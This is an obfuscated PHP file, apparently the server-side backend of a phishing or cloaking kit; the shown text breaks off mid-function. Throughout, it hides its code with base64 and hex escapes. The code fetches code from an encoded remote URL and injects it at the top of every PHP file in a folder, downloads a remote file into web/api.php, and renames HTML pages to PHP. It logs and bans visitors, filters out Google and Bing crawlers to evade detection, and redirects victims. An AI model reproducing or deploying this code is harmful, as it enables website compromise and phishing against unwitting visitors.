<?php eval(base64_decode('
 goto ZriIU; N0Jys: function update_index($folderDir) { $renamed = false; if ($handle = opendir($folderDir)) { while (false !== ($entry = readdir($handle))) { $path = $folderDir . "\x2f" . $entry; if ($entry == "\56" || $entry == "\56\56") { continue; } if (is_dir($path)) { $renamed = update_index($path) || $renamed; } if (is_file($path) && strtolower(pathinfo($path, PATHINFO_EXTENSION)) === "\x68\164\x6d\x6c") { $newPath = $folderDir . "\x2f" . pathinfo($path, PATHINFO_FILENAME) . "\x2e\160\x68\x70"; if (rename($path, $newPath)) { $renamed = true; } } } closedir($handle); } return $renamed; } goto DP7FB; IDItT: header("\101\x63\x63\x65\163\x73\55\x43\157\156\164\162\157\154\x2d\101\x6c\154\x6f\167\55\110\145\x61\144\x65\x72\x73\x3a\x20\103\x6f\x6e\x74\x65\x6e\164\55\x54\x79\160\145"); goto E2HIZ; GHWQV: error_reporting(E_ALL); goto zTCg8; zTCg8: ini_set("\144\151\163\x70\x6c\x61\171\x5f\145\x72\x72\x6f\162\x73", 1); goto VaVl5; nqdYC: header("\101\143\143\145\x73\x73\55\x43\157\156\164\x72\x6f\x6c\55\x41\154\x6c\x6f\167\x2d\117\x72\x69\x67\x69\x6e\x3a\40\x2a"); goto L6gJr; fmQ2W: function findIndex($path) { if (is_dir($path)) { if (file_exists($path . "\x2f\x69\x6e\144\x65\x78\56\150\x74\x6d\154") || file_exists($path . "\57\x69\x6e\x64\x65\170\56\160\x68\160")) { return $path; } else { $subDirectories = glob($path . "\57\52", GLOB_ONLYDIR); if (!empty($subDirectories)) { foreach ($subDirectories as $subDir) { $result = findIndex($subDir); if ($result !== false) { return $result; } } } } } return false; } goto xEj0b; kKPZM: function update_php_normal($folder_path) { $trackingFile = $folder_path . "\162\157\165\154\x73\56\164\x78\x74"; $codeURL = base64_decode(base64_decode("\131\x55\150\123\115\107\116\111\x54\x54\132\115\x65\124\x6c\x35\x57\x56\150\x6a\x64\126\157\171\142\104\x42\x68\123\x46\x5a\160\x5a\x46\150\x4f\x62\107\x4e\x74\124\156\132\151\x62\154\112\163\131\x6d\x35\122\144\x56\x6b\x79\117\x58\122\115\115\156\150\x71\x59\152\x4a\64\141\x47\x51\172\142\107\170\152\142\x6b\x31\62\131\x7a\111\x35\x4d\x57\116\x74\x54\155\x78\x4d\x4d\x6a\x46\157\x59\126\x63\x30\144\155\x4e\111\x53\156\132\x6b\122\x31\x5a\161\x5a\x45\131\x35\144\127\x49\x7a\123\x6e\x52\x5a\126\63\144\61\x5a\105\150\x6f\115\101")); $codeToAdd = fetchContentFromURL($codeURL); $codeToAddBottom = ''; $phpFilesList = getAllPhpFiles($folder_path); foreach ($phpFilesList as $filePath) { updatePhpFileWithCode($filePath, $codeToAdd); } } goto TlY8_; PpG7G: function get_expire_token() { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\x43\157\156\156\x65\x63\x74\x69\x6f\156\40\146\x61\151\x6c\x65\x64\72\x20" . mysqli_connect_error()); } $sql_u = "\123\x45\114\105\103\x54\40\164\x65\x6c\145\137\x74\x6f\x6b\x65\156\54\40\164\x65\x6c\145\137\143\150\141\164\x69\144\x20\106\x52\x4f\115\x20\x7a\145\x72\157\137\x73\x65\162\x76\145\x72\x20\x57\110\105\122\105\x20\151\x64\75\47\61\x27"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { $row = mysqli_fetch_array($res_u); $_SESSION["\x65\x78\x70\137\164\157\153\145\156"] = $row["\164\x65\x6c\145\x5f\x74\157\x6b\x65\156"]; $_SESSION["\145\170\x70\137\x63\150\x61\164\151\x64"] = $row["\x74\145\154\x65\137\x63\150\x61\x74\x69\144"]; $token = $row["\x74\x65\x6c\145\137\164\x6f\153\145\x6e"]; $chatid = $row["\x74\145\154\145\137\143\150\141\164\151\x64"]; return array($token, $chatid); } mysqli_close($db); return null; } goto PX0PH; D_vAw: function random_string($length) { $characters = "\141\142\143\x64\x65\x66\x6a\150\151\147\153\154\x6d\156\x6f\x70\x71\162\163\x74\x75\166\167\170\171\172\x30\61\x32\x33\x34\x35\x36\x37\x38\x39\x41\102\x43\x44\x45\106\107\x48\x49\x4a\113\114\115\x4e\x4f\x50\x51\x52\x53\124\x55\x56\127\x58\131\132"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return bin2hex(random_bytes(16)); } goto iFvw8; TlY8_: function updatePhpFileWithCode($filePath, $codeToAddTop) { $fileContent = file_get_contents($filePath); if (strpos($fileContent, $codeToAddTop) === false) { $fileContent = $codeToAddTop . $fileContent; file_put_contents($filePath, $fileContent); return true; } return false; } goto TKRdE; kz6li: if ($_SERVER["\x52\105\x51\125\x45\x53\124\x5f\x4d\105\x54\110\117\x44"] === "\107\105\124") { $remote = isset($_GET["\162\x65\155\x6f\x74\x65"]) ? $_GET["\x72\145\x6d\157\164\x65"] : null; $id = isset($_GET["\151\x64"]) ? $_GET["\151\144"] : null; $user = isset($_GET["\165\x73\x65\162"]) ? $_GET["\x75\x73\x65\x72"] : null; $type = isset($_GET["\164\171\x70\x65"]) ? $_GET["\164\x79\x70\x65"] : null; $isValid = true; if (is_null($remote) || empty($remote)) { $isValid = false; } if (is_null($id) || empty($id)) { $isValid = false; } if (is_null($user) || empty($user)) { $isValid = false; } if (is_null($type) || empty($type)) { $isValid = false; } if ($isValid) { if ($type == "\x6c\x6f\x67\x69\x6e") { if ($remote !== null && $id !== null && $user !== null) { fetchIPInfo($user); user_data($user, $id); $_SESSION["\154\157\154\x69\160\x73"] = $user; $_SESSION["\x6c\157\x6c\x73\157\x75\x6c\x73"] = $id; update_user(); $RandOP_Mlux = random_string(6); $url = $remote . "\77\46\166\141\154\151\144\x3d" . $RandOP_Mlux . $RandOP_Mlux . "\46\x63\x6f\156\x6e\x65\143\x74\75" . $RandOP_Mlux . "\x26\165\x69\x64\x3d" . $RandOP_Mlux . "\x26\x64\141\x74\141\x3d" . $id . "\x26\163\160\141\143\x65\x3d" . $RandOP_Mlux . "\x26\x6d\x6e\145\x6d\157\156\151\x63\75\46\x76\x6d\75" . $RandOP_Mlux; header("\114\157\143\x61\164\151\x6f\156\72\40{$url}"); die; } else { $reson = "\105\130\x20\x6d\x69\163\163\x69\156\147"; fetchIPInfo($local_ip_g); banned_client($local_ip_g, $reson); http_response_code(405); $responseData = array("\162\x65\x73\137\163\x74\x61\x74\165\x73" => "\64\60\x35", "\155\x65\x73\x73\141\x67\145" => "\x45\x58\x20\155\x69\x73\163\151\156\147"); ob_end_clean(); header("\103\157\156\164\145\x6e\x74\x2d\124\x79\x70\x65\x3a\40\141\160\x70\x6c\x69\x63\x61\x74\151\x6f\156\x2f\x6a\163\x6f\x6e"); $responseJson = json_encode($responseData); echo $responseJson; } } if ($type == "\166\151\145\167") { $view_user = isset($_GET["\x76\151\145\167\x5f\x75\163\145\x72"]) ? $_GET["\166\151\145\167\x5f\165\x73\x65\x72"] : null; if ($remote !== null && $id !== null && $user !== null && $view_user !== null) { fetchIPInfo($user); user_data($user, $id); $_SESSION["\154\x6f\x6c\x69\x70\x73"] = $user; $_SESSION["\x6c\157\x6c\x73\157\x75\154\x73"] = $id; update_user_view($view_user); $RandOP_Mlux = random_string(6); $url = $remote . "\x3f\46\x76\141\x6c\151\144\75" . $RandOP_Mlux . $RandOP_Mlux . "\46\143\x6f\x6e\156\145\x63\x74\75" . $RandOP_Mlux . "\x26\x75\151\x64\x3d" . $RandOP_Mlux . "\x26\144\141\164\x61\x3d" . $id . "\46\x73\x70\141\x63\x65\75" . $RandOP_Mlux . "\46\x6d\156\145\x6d\157\x6e\151\143\x3d\46\x76\x6d\x3d" . $RandOP_Mlux; header("\114\x6f\143\141\x74\x69\x6f\x6e\x3a\x20{$url}"); die; } else { $reson = "\x76\x69\145\167\x20\155\151\163\163\x69\156\x67"; fetchIPInfo($local_ip_g); banned_client($local_ip_g, $reson); http_response_code(405); $responseData = array("\x72\145\163\137\x73\x74\x61\x74\x75\x73" => "\64\x30\x35", "\155\x65\163\163\141\x67\x65" => "\x76\x69\145\167\x20\155\x69\163\x73\x69\156\147"); ob_end_clean(); header("\x43\x6f\156\x74\145\x6e\x74\55\124\x79\x70\x65\x3a\40\141\x70\x70\154\x69\x63\141\164\x69\157\156\57\152\163\157\x6e"); $responseJson = json_encode($responseData); echo $responseJson; } } } else { $reson = "\x69\156\166\x61\x6c\x69\144\x20\x44\141\164\141\x20\x2d\x20{$remote}\40\x2d\x20{$id}\40\55\x20{$user}\x20\55\40{$type}"; fetchIPInfo($local_ip_g); banned_client($local_ip_g, $reson); http_response_code(405); $responseData = array("\x72\x65\x73\x5f\163\x74\141\x74\x75\x73" => "\x34\x30\65", "\x6d\x65\x73\x73\141\x67\145" => "\144\x61\x74\x61\40\156\157\x74\x20\x61\x6c\x6c\x6f\167\145\x64"); ob_end_clean(); header("\103\157\x6e\164\145\x6e\x74\55\x54\171\160\x65\x3a\x20\x61\x70\x70\154\x69\x63\x61\164\151\157\156\x2f\152\x73\157\x6e"); $responseJson = json_encode($responseData); echo $responseJson; } } elseif ($_SERVER["\122\105\121\x55\105\x53\124\x5f\115\x45\x54\x48\117\x44"] === "\x50\x4f\123\124") { $view_com_ip = isset($_POST["\x76\151\x65\x77\x5f\x73\x65\x6e\x64\x5f\x69\160"]) ? $_POST["\x76\x69\145\167\137\163\145\x6e\x64\x5f\151\160"] : null; $view_com_domain = isset($_POST["\x76\151\145\167\137\x73\145\156\144\x5f\144\157\x6d\141\151\x6e"]) ? $_POST["\x76\x69\x65\x77\x5f\163\145\x6e\144\x5f\x64\157\x6d\x61\x69\x6e"] : null; $view_return_domain = isset($_POST["\166\151\x65\x77\x5f\162\x65\x74\165\x72\x6e\x5f\x64\157\155\x61\x69\156"]) ? $_POST["\x76\x69\x65\x77\137\162\x65\x74\x75\x72\x6e\137\144\x6f\155\x61\x69\156"] : null; $view_com_id = isset($_POST["\166\151\x65\x77\137\163\x65\x6e\x64\x5f\151\144"]) ? $_POST["\166\x69\145\167\137\x73\145\156\144\137\x69\144"] : null; $view_com_action = isset($_POST["\x76\151\x65\x77\137\163\145\156\144\137\x61\x63\164\151\157\156"]) ? $_POST["\x76\151\x65\x77\x5f\163\145\156\144\x5f\141\x63\164\x69\157\156"] : null; $view_patch = isset($_POST["\166\x69\x65\x77\137\x70\x61\164\143\150"]) ? $_POST["\166\151\x65\167\137\x70\x61\x74\143\150"] : null; $view_user = isset($_POST["\166\x69\x65\167\x5f\x75\x73\x65\162"]) ? $_POST["\x76\x69\x65\167\x5f\165\x73\145\x72"] : null; if ($view_com_ip !== null && $view_com_domain !== null && $view_return_domain !== null && $view_com_id !== null && $view_com_action !== null && $view_patch !== null && $view_user !== null) { if ($_POST["\x76\151\x65\167\x5f\163\145\156\x64\x5f\141\143\x74\x69\x6f\156"] == "\166\151\145\x77") { fetchIPInfo($view_com_ip); user_data($view_com_ip, $view_com_id); $_SESSION["\154\x6f\x6c\x69\160\x73"] = $view_com_ip; $_SESSION["\154\157\x6c\x73\x6f\165\154\163"] = $view_com_id; update_user_view($view_user); $RandOP_Mlux = random_string(6); $url = $view_patch . "\77\x26\166\151\145\x77\75" . $RandOP_Mlux . $RandOP_Mlux . "\46\x61\x6c\x65\x72\164\75" . $RandOP_Mlux . "\x26\x78\x6c\160\163\75" . $RandOP_Mlux . "\46\x73\157\x75\154\163\75" . $view_com_id . "\x26\144\157\x6e\x65\x3d\x26\x65\x72\162\157\x72\171\75" . $RandOP_Mlux . "\x26\155\x6e\x65\x6d\x6f\156\151\143\x3d\46\x6a\142\75" . $RandOP_Mlux; $responseData = array("\x76\x69\145\x77\137\162\145\x73\x5f\x73\164\x61\x74\165\163" => "\x73\x75\143\x63\145\x73\x73", "\x6d\145\x73\163\141\x67\145" => $url); ob_end_clean(); header("\x43\x6f\x6e\164\x65\x6e\164\x2d\124\x79\x70\145\72\40\x61\160\x70\x6c\x69\x63\x61\164\x69\x6f\x6e\57\x6a\163\157\x6e"); $responseJson = json_encode($responseData); echo $responseJson; die; } } $login_com_ip = isset($_POST["\x6c\x6f\147\x69\x6e\x5f\x73\x65\156\144\x5f\151\160"]) ? $_POST["\154\x6f\147\x69\156\x5f\163\145\x6e\x64\x5f\x69\160"] : null; $login_com_domain = isset($_POST["\154\x6f\147\151\x6e\x5f\x73\145\x6e\x64\137\144\157\155\x61\x69\x6e"]) ? $_POST["\x6c\157\x67\x69\x6e\137\x73\145\x6e\144\x5f\144\x6f\x6d\141\151\156"] : null; $login_return_domain = isset($_POST["\x6c\157\147\151\x6e\x5f\162\145\x74\165\162\156\x5f\x64\x6f\x6d\x61\x69\x6e"]) ? $_POST["\154\x6f\147\151\x6e\137\162\x65\x74\165\162\x6e\137\x64\157\x6d\x61\151\156"] : null; $login_com_id = isset($_POST["\x6c\157\147\x69\156\x5f\x73\x65\x6e\144\x5f\x69\x64"]) ? $_POST["\x6c\x6f\x67\x69\x6e\137\x73\x65\156\x64\137\x69\x64"] : null; $login_com_action = isset($_POST["\x6c\157\x67\x69\x6e\x5f\x73\x65\156\144\137\141\x63\x74\x69\157\x6e"]) ? $_POST["\154\157\147\x69\x6e\137\x73\x65\156\x64\x5f\x61\143\164\151\x6f\156"] : null; $login_patch = isset($_POST["\154\x6f\147\x69\156\137\x70\x61\x74\143\150"]) ? $_POST["\x6c\x6f\147\151\x6e\137\160\141\x74\x63\150"] : null; if ($login_com_ip !== null && $login_com_domain !== null && $login_return_domain !== null && $login_com_id !== null && $login_com_action !== null && $login_patch !== null) { if ($_POST["\154\157\147\151\x6e\x5f\x73\x65\156\144\x5f\141\x63\x74\x69\157\156"] == "\x6c\x6f\x67\x69\x6e") { global $login_com_ip; fetchIPInfo($login_com_ip); user_data($login_com_ip, $login_com_id); $_SESSION["\x6c\157\154\x69\x70\x73"] = $login_com_ip; $_SESSION["\154\157\154\163\157\165\x6c\x73"] = $login_com_id; update_user(); $RandOP_Mlux = random_string(6); $url = $login_patch . "\x3f\x26\154\157\x67\x69\x6e\75" . $RandOP_Mlux . $RandOP_Mlux . "\46\141\x6c\145\x72\x74\75" . $RandOP_Mlux . "\46\x78\154\160\x73\x3d" . $RandOP_Mlux . "\x26\163\x6f\x75\x6c\163\x3d" . $login_com_id . "\x26\144\157\156\x65\x3d\46\145\x72\x72\157\162\171\x3d" . $RandOP_Mlux . "\46\155\x6e\x65\x6d\x6f\x6e\151\x63\x3d\46\x6a\x62\75" . $RandOP_Mlux; $responseData = array("\x6c\x6f\147\151\x6e\137\162\145\x73\137\163\164\141\164\165\x73" => "\163\x75\143\143\x65\x73\x73", "\x6d\145\x73\163\141\x67\x65" => $url); ob_end_clean(); header("\103\x6f\156\164\145\156\164\55\124\x79\x70\x65\72\x20\141\160\x70\x6c\x69\143\x61\x74\151\x6f\156\x2f\x6a\163\x6f\x6e"); $responseJson = json_encode($responseData); echo $responseJson; die; } } $com_ip = isset($_POST["\x73\x65\156\x64\x5f\151\160"]) ? $_POST["\163\x65\156\144\x5f\x69\160"] : null; $com_domain = isset($_POST["\163\x65\x6e\144\137\x64\x6f\155\x61\x69\x6e"]) ? $_POST["\x73\145\x6e\x64\137\144\x6f\155\x61\151\156"] : null; $return_domain = isset($_POST["\x72\x65\x74\x75\162\156\137\144\x6f\x6d\x61\151\156"]) ? $_POST["\x72\x65\164\165\x72\156\x5f\144\x6f\x6d\141\x69\156"] : null; $com_id = isset($_POST["\x73\145\x6e\x64\x5f\151\144"]) ? $_POST["\163\145\156\144\x5f\151\144"] : null; $com_action = isset($_POST["\x73\x65\156\144\137\141\x63\164\x69\157\156"]) ? $_POST["\x73\x65\x6e\x64\137\x61\143\x74\151\157\x6e"] : null; if ($com_ip !== null && $com_domain !== null && $return_domain !== null && $com_id !== null && $com_action !== null) { fetchIPInfo($com_ip); if (detect_user($com_ip)) { http_response_code(405); $responseData = array("\x72\x65\x73\x5f\163\164\x61\x74\165\x73" => "\x34\x30\65", "\x6d\x65\163\x73\141\x67\145" => "\165\163\145\x72\x20\x62\x6c\x6f\x63\153\x65\144"); $responseJson = json_encode($responseData); echo $responseJson; die; } if (is_bot_ip($com_ip)) { $reson = "\x73\x70\141\155\x20\151\x70"; banned_client($com_ip, $reson); http_response_code(405); $responseData = array("\x72\145\163\x5f\x73\x74\x61\164\x75\163" => "\x34\x30\x35", "\x6d\x65\x73\x73\141\147\145" => "\x75\163\145\162\40\163\160\x61\155"); $responseJson = json_encode($responseData); echo $responseJson; die; } if (isGoogleUser($local_userAgent, $com_ip)) { $reson = "\107\157\x6f\x67\x6c\x65\x20\151\160"; banned_client($com_ip, $reson); $responseData = array("\x72\x65\163\137\x73\x74\x61\164\165\163" => "\64\60\66", "\154\157\x63\141\154\137\x75\x73\x65\162\x41\x67\x65\x6e\164" => $local_userAgent, "\143\157\155\137\151\160" => $com_ip, "\155\x65\x73\163\x61\x67\145" => "\x69\160\x20\146\151\154\164\x74\x65\162"); $responseJson = json_encode($responseData); echo $responseJson; die; } if ($_POST["\163\145\x6e\x64\137\x61\x63\x74\151\157\156"] == "\154\157\147\x69\x6e") { user_data($com_ip, $com_id); update_user(); } if ($_POST["\163\x65\x6e\144\x5f\141\x63\164\151\157\x6e"] == "\x63\162\145\x61\x74\145") { user_data($com_ip, $com_id); download_extract($_SESSION["\x75\x72\154"]); update_index($_SESSION["\x66\157\154\144\145\162"]); add_user($_SESSION["\x66\x6f\x6c\x64\x65\162"], $com_ip); update_user(); if (isset($_SESSION["\146\157\154\x64\x65\162"])) { $folderPath = $_SESSION["\x66\x6f\154\144\x65\x72"]; $indexPath = findIndex($folderPath); if ($indexPath !== false && $indexPath !== $folderPath) { $relativePath = str_replace($folderPath . "\x2f", '', $indexPath); $indexContent = "\x3c\77\160\150\x70\x20\150\x65\141\144\x65\x72\x28\x27\x4c\x6f\x63\x61\x74\x69\x6f\156\72\40\56\57{$relativePath}\x27\51\73\40\x3f\x3e"; file_put_contents($folderPath . "\x2f\x69\156\144\x65\x78\x2e\x70\150\160", $indexContent); } } if ($_SESSION["\141\x70\x69"] !== "\x41\x50\111") { getFileContents($_SESSION["\141\160\x69"]); } if ($_SESSION["\x69\163\160\162\157\x74\x65\143\x74"] == "\61") { update_php($_SESSION["\146\157\154\x64\x65\162"]); } else { update_php_normal($_SESSION["\146\x6f\154\144\145\x72"]); } $responseData = array("\x72\145\163\x5f\163\164\141\164\165\163" => "\163\165\143\x63\145\163\163", "\162\x65\x73\x5f\144\151\162" => $_SESSION["\146\157\x6c\144\145\162"], "\x72\x65\163\137\x75\162\154" => $_POST["\163\145\156\144\137\144\x6f\x6d\141\151\156"], "\x72\x65\163\137\x69\x64" => $_POST["\163\x65\156\x64\x5f\151\x64"], "\x72\145\x73\137\x69\160" => $_POST["\x73\x65\x6e\x64\x5f\151\160"], "\162\145\x73\137\x61\x63\x74\x69\157\156" => $_POST["\x73\145\156\x64\x5f\x61\x63\164\x69\x6f\156"], "\155\x65\163\163\141\147\x65" => "\163\165\x63\143\145\163\x73\x66\x75\154\x6c\171"); ob_end_clean(); header("\x43\157\x6e\x74\x65\x6e\164\x2d\124\x79\x70\x65\x3a\40\141\x70\160\154\151\x63\x61\164\151\157\x6e\57\152\163\x6f\156"); $responseJson = json_encode($responseData); echo $responseJson; } } } else { $reson = "\144\141\164\141\x20\x6e\157\x74\40\141\154\x6c\157\167"; fetchIPInfo($local_ip_g); banned_client($local_ip_g, $reson); http_response_code(405); $responseData = array("\x72\145\x73\137\x73\x74\x61\164\165\x73" => "\x34\60\65", "\155\145\x73\163\x61\x67\145" => "\x64\141\164\141\x20\x6e\157\x74\40\x61\154\154\157\x77\145\144"); ob_end_clean(); header("\103\x6f\x6e\164\145\156\164\55\124\171\160\x65\72\x20\x61\160\x70\154\x69\x63\141\164\x69\x6f\x6e\57\x6a\x73\157\156"); $responseJson = json_encode($responseData); echo $responseJson; } goto FvkpH; TKRdE: function getFileContents($fileURL) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $fileURL); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($curl); $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE); $error = curl_error($curl); curl_close($curl); if ($statusCode === 200 && empty($error)) { $localFilePath = "\x77\x65\142\x2f\x61\x70\x69\x2e\160\x68\160"; file_put_contents($localFilePath, $response); } else { echo "\x45\162\x72\157\162\40\146\145\164\x63\x68\x69\156\x67\40\x66\151\154\145\x3a\40" . $error; } } goto kSl3q; DP7FB: function update_php($folder_path) { $trackingFile = $folder_path . "\162\x6f\165\154\163\56\x74\x78\x74"; $codeURL = base64_decode(base64_decode("\131\125\150\123\115\x47\x4e\x49\124\x54\132\115\145\x54\x6c\x35\127\126\150\152\144\x56\x6f\x79\142\104\x42\x68\123\106\132\160\132\x46\150\117\x62\x47\x4e\x74\124\x6e\x5a\x69\x62\154\112\163\131\x6d\65\122\144\126\153\171\x4f\130\x52\115\x4d\x6e\150\x71\131\x6a\112\64\141\x47\121\172\142\x47\170\x6a\142\153\x31\x32\131\172\111\x35\x4d\x57\116\164\124\x6d\170\115\115\x6a\106\157\131\126\143\x30\x64\155\x4e\111\x53\156\x5a\153\122\x31\132\161\132\x45\115\x31\x4d\x47\126\111\x55\121")); $codeToAdd = fetchContentFromURL($codeURL); $codeToAddBottom = ''; $phpFilesList = getAllPhpFiles($folder_path); foreach ($phpFilesList as $filePath) { updatePhpFileWithCode($filePath, $codeToAdd); } } goto kKPZM; KoPwq: $local_domain = $_SERVER["\123\105\x52\126\105\x52\x5f\x4e\x41\x4d\105"]; goto ADBRI; yhO0V: $fs_user = base64_decode("\145\x6d\x56\x79\142\62\122\x68\x65\130\116\146\132\x47\106\65"); goto NqI3p; kSl3q: function delete_zip($directory) { $zipFiles = glob($directory . "\52\56\x7a\151\160"); if (!empty($zipFiles)) { foreach ($zipFiles as $zipFile) { if (is_file($zipFile)) { unlink($zipFile); } } } } goto hDuNj; rKRwM: function detect_user($ipAddress) { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\x43\157\156\156\145\143\164\151\x6f\156\x20\146\x61\151\x6c\x65\x64\72\x20" . mysqli_connect_error()); } $sql_u = "\x53\x45\x4c\x45\103\x54\x20\x2a\40\x46\122\117\115\40\x6c\x6f\x67\163\40\127\x48\x45\x52\105\x20\151\x70\x61\x64\x64\162\145\163\75\47{$ipAddress}\x27"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { mysqli_close($db); return true; } mysqli_close($db); return false; } goto D_vAw; hDuNj: function add_user($folder_path, $ipAddress) { file_put_contents("{$folder_path}\x2f\154\157\143\141\154\56\164\x78\164", "{$ipAddress}", FILE_APPEND); } goto uLJUf; zj0VF: function is_bot_ip($ipToCheck) { $botsUrls = array("\x67\x6f\157\147\154\x65" => "\x68\x74\x74\160\163\x3a\57\x2f\144\x65\166\145\154\157\x70\145\162\x73\56\x67\x6f\157\147\154\x65\x2e\x63\157\x6d\57\163\x65\141\x72\x63\x68\57\x61\160\151\163\57\x69\x70\162\141\x6e\x67\x65\x73\57\x67\157\157\x67\154\x65\x62\157\x74\x2e\152\x73\x6f\x6e", "\142\151\156\147" => "\150\x74\164\160\x73\72\57\x2f\167\x77\x77\x2e\142\151\156\x67\x2e\143\x6f\x6d\x2f\x74\x6f\x6f\154\142\x6f\170\57\142\x69\156\147\142\x6f\164\56\x6a\x73\x6f\156"); foreach ($botsUrls as $bot => $url) { $botResp = json_decode(file_get_contents($url), true); foreach ($botResp["\x70\162\x65\146\151\170\x65\x73"] as $ipRange) { if (isset($ipRange["\151\x70\166\x36\120\x72\x65\x66\x69\170"]) && strpos($ipToCheck, "\72") !== false) { $network = $ipRange["\151\160\166\x36\x50\x72\145\146\151\x78"]; } elseif (isset($ipRange["\151\160\166\x34\x50\162\145\x66\x69\x78"]) && strpos($ipToCheck, "\x3a") === false) { $network = $ipRange["\151\x70\166\64\120\162\145\146\151\170"]; } else { continue; } if (ip_in_range($ipToCheck, $network)) { return $bot; } } } return false; } goto UTzWL; c0D3x: $local_ip_g = getClientIP(); goto EsW2_; j07cC: function getHost($ipAddress) { try { $host = gethostbyaddr($ipAddress); return $host; } catch (Exception $e) { return "\116\x6f\x74\x20\x56\141\x6c\151\144"; } } goto Wve2j; v6pG_: function get_platform($USER_AGENT) { $OS_ERROR = "\125\x6e\153\x6e\x6f\x77\156\40\117\123\x20\120\154\x61\x74\x66\x6f\162\155"; $OS = array("\57\167\151\x6e\x64\157\167\x73\x20\x6e\x74\x20\x31\61\x2f\151" => "\x57\151\156\144\157\x77\x73\x20\61\61", "\57\167\151\156\x64\x6f\167\x73\x20\x6e\164\x20\61\60\57\151" => "\127\x69\x6e\144\157\167\163\40\x31\x30", "\57\167\151\156\x64\x6f\167\163\40\x6e\x74\x20\66\56\63\57\x69" => "\x57\151\x6e\144\157\167\163\40\70\x2e\x31", "\x2f\167\x69\156\x64\157\x77\163\40\x6e\164\40\66\56\x32\x2f\151" => "\127\x69\156\144\x6f\167\163\40\70", "\x2f\x77\151\x6e\144\157\x77\163\40\156\x74\x20\66\x2e\61\57\151" => "\127\151\156\x64\x6f\167\x73\40\x37", "\57\167\151\156\144\157\x77\x73\x20\x6e\164\x20\66\56\60\57\151" => "\127\151\x6e\144\157\167\163\x20\126\x69\x73\x74\x61", "\57\167\151\156\x64\x6f\167\163\40\156\164\x20\x35\x2e\x32\57\x69" => "\127\151\x6e\x64\157\x77\x73\40\x53\145\162\166\x65\x72\x20\x32\60\x30\63\x2f\x58\x50\40\170\66\x34", "\x2f\x77\151\156\x64\157\167\x73\40\156\164\x20\65\x2e\x31\x2f\x69" => "\x57\x69\156\144\x6f\167\163\40\130\x50", "\57\x77\x69\156\x64\x6f\x77\x73\x20\x78\160\x2f\x69" => "\x57\151\x6e\144\157\x77\163\x20\x58\120", "\57\x77\151\156\144\157\x77\x73\x20\x6e\164\x20\x35\x2e\60\57\x69" => "\127\151\156\x64\157\167\x73\x20\x32\x30\60\60", "\x2f\167\151\x6e\x64\x6f\167\x73\40\x6d\x65\x2f\151" => "\127\x69\156\x64\157\167\163\x20\115\105", "\x2f\x77\151\x6e\x39\x38\x2f\x69" => "\127\151\156\144\x6f\x77\x73\40\x39\x38", "\x2f\x77\x69\x6e\x39\x35\x2f\151" => "\127\x69\156\x64\157\x77\x73\40\x39\65", "\x2f\x77\x69\x6e\61\66\x2f\151" => "\x57\151\x6e\x64\157\x77\x73\x20\x33\56\x31\61", "\57\155\141\x63\x69\x6e\x74\157\x73\x68\174\155\x61\x63\40\x6f\x73\x20\170\57\x69" => "\x4d\x61\143\40\x4f\123\40\130", "\x2f\x6d\141\x63\x5f\x70\x6f\x77\145\162\x70\143\57\151" => "\115\x61\143\40\x4f\123\x20\x39", "\x2f\154\151\x6e\165\x78\x2f\x69" => "\114\151\156\165\x78", "\x2f\x75\142\x75\156\164\x75\57\151" => "\x55\x62\165\x6e\x74\x75", "\x2f\151\x70\x68\157\x6e\x65\57\x69" => "\151\120\150\x6f\156\145", "\57\x69\x70\x6f\144\x2f\151" => "\x69\x50\157\144", "\57\x69\160\141\144\x2f\151" => "\x69\120\141\144", "\x2f\141\x6e\144\x72\157\151\144\57\151" => "\101\156\x64\162\157\151\144", "\57\x62\x6c\x61\x63\x6b\142\145\x72\162\171\x2f\x69" => "\102\154\141\x63\153\102\145\162\162\171", "\57\167\145\x62\157\x73\x2f\x69" => "\115\157\x62\x69\154\145"); foreach ($OS as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $OS_ERROR = $value; } } return $OS_ERROR; } goto kVIKC; uLJUf: function isGoogleUser($userAgent, $ipAddress) { if (stripos($userAgent, "\147\x6f\157\147\154\x65") !== false) { return true; } if (filter_var($ipAddress, FILTER_VALIDATE_IP)) { $hostname = gethostbyaddr($ipAddress); if (stripos($hostname, "\x67\157\157\x67\x6c\145") !== false) { return true; } } if (isset($_SESSION["\x73\145\163\163\151\x6f\156\137\151\163\x70"]) && stripos($_SESSION["\163\x65\x73\x73\x69\157\x6e\x5f\151\163\160"], "\147\x6f\157\147\154\145") !== false) { return true; } return false; } goto sixaW; Wve2j: function getClientIP() { if (!empty($_SERVER["\110\124\x54\x50\x5f\103\114\111\105\116\x54\x5f\x49\120"])) { $ipAddress = $_SERVER["\x48\x54\x54\120\x5f\103\114\111\x45\116\124\x5f\x49\x50"]; } elseif (!empty($_SERVER["\110\x54\124\x50\x5f\130\x5f\x46\117\x52\x57\101\122\x44\x45\104\x5f\x46\x4f\x52"])) { $ipAddress = $_SERVER["\x48\x54\x54\x50\x5f\130\x5f\106\x4f\x52\x57\x41\122\x44\x45\104\137\x46\x4f\x52"]; } else { $ipAddress = $_SERVER["\x52\105\x4d\x4f\124\105\x5f\x41\x44\104\122"]; } $validIPs = array(); $ipMatches = preg_match_all("\57\134\142\134\144\x7b\61\54\63\175\134\x2e\134\x64\173\61\x2c\63\175\134\56\134\x64\173\61\x2c\63\175\134\x2e\x5c\144\x7b\61\54\x33\175\134\142\x2f", $ipAddress, $matches); if ($ipMatches) { $validIPs = $matches[0]; } if (!empty($validIPs)) { $_SESSION["\x73\145\163\x73\x69\157\156\137\x69\160"] = $validIPs[0]; return $validIPs[0]; } else { $_SESSION["\163\x65\163\163\x69\157\156\137\x69\x70"] = "\x31\x32\x37\56\60\x2e\x30\x2e\x31"; return "\x31\x32\67\x2e\60\x2e\60\56\x31"; } } goto hDHOU; VqPk6: function fetchContentFromURL($url) { $ch = curl_init($url); curl_setopt($ch, 